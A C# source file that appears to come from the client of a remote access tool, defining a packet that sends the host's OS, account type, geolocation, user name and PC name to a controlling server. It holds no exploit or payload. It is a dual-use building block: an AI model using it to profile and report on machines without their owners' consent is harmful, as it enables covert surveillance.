using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
    [Serializable]
    public class GetAuthenticationResponse : IPacket
    {
        public string Version { get; set; }

        public string OperatingSystem { get; set; }

        public string AccountType { get; set; }

        public string Country { get; set; }

        public string CountryCode { get; set; }

        public string Region { get; set; }

        public string City { get; set; }

        public int ImageIndex { get; set; }

        public string Id { get; set; }

        public string Username { get; set; }

        public string PCName { get; set; }

        public string Tag { get; set; }

        public GetAuthenticationResponse()
        {
        }

        public GetAuthenticationResponse(string version, string operatingsystem, string accounttype, string country, string countrycode,
            string region, string city, int imageindex, string id, string username, string pcname, string tag)
        {
            Version = version;
            OperatingSystem = operatingsystem;
            AccountType = accounttype;
            Country = country;
            CountryCode = countrycode;
            Region = region;
            City = city;
            ImageIndex = imageindex;
            Id = id;
            Username = username;
            PCName = pcname;
            Tag = tag;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}